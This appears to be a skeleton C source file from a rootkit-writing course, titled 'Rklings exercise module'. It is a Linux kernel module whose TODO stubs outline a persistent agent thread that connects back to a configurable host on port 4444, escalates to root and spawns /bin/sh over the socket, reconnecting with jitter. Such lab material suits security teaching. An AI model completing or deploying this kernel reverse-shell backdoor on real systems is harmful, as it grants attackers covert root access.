// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/cred.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/mutex.h>
#include <linux/random.h>
#include <linux/wait.h>
#include <net/sock.h>

static char *host = "10.0.2.2";
module_param(host, charp, 0400);

static int port = 4444;
module_param(port, int, 0400);

static unsigned long reconnect_delay_ms = 5000;
module_param(reconnect_delay_ms, ulong, 0400);

static struct task_struct *rk_thread;
static DECLARE_WAIT_QUEUE_HEAD(rk_wq);
static DEFINE_MUTEX(rk_shell_lock);
static bool rk_shell_busy;
static struct file *rk_sock_file;

// Escalate to root and redirect fds to the socket
static int rk_umh_init(struct subprocess_info *info, struct cred *new)
{
	int fd;
	int i;

	// TODO: Escalate to root (same as L16).

	// TODO: Loop i from 0 to 2, install rk_sock_file as fd (same as L17).
	// pr_info("rklings: redirect fds here\n");

	return 0;
}

// One connection attempt: connect, spawn shell, wait for exit
static int rk_try_connect(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	struct subprocess_info *umh_info;
	int error;

	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	// TODO: Lock rk_shell_lock. If rk_shell_busy, return -EBUSY.
	// Set rk_shell_busy = true.

	// TODO: Create kernel socket (same as L14). On error, goto out_clear.

	// TODO: Fill addr, kernel_connect. On error, goto out_sock.

	// TODO: sock_alloc_file. On error, goto out_sock.

	// TODO: call_usermodehelper_setup with rk_umh_init.
	// On NULL, error = -ENOMEM, goto out_file.

	// TODO: call_usermodehelper_exec with UMH_WAIT_PROC.
	// UMH_WAIT_PROC blocks until the shell exits, so the agent
	// knows when to reconnect.
	// pr_info("rklings: spawn shell here\n");

	return 0;

out_file:
	fput(rk_sock_file);
	rk_sock_file = NULL;
	goto out_clear;

out_sock:
	sock_release(sock);

out_clear:
	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
	return error;
}

static int rk_agent_fn(void *data)
{
	unsigned long delay;
	unsigned long jitter_ms = 3000;

	// TODO: Loop while !kthread_should_stop().
	//   Call rk_try_connect().
	//   If kthread_should_stop(), break.
	//   Sleep with jittered delay (same as L15).
	// pr_info("rklings: implement agent loop\n");

	return 0;
}

static int __init rk_init(void)
{
	// TODO: kthread_run(rk_agent_fn, NULL, "rkworker").
	// Check IS_ERR.

	return 0;
}

static void __exit rk_exit(void)
{
	// TODO: kthread_stop, clean up rk_sock_file, clear shell state.
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
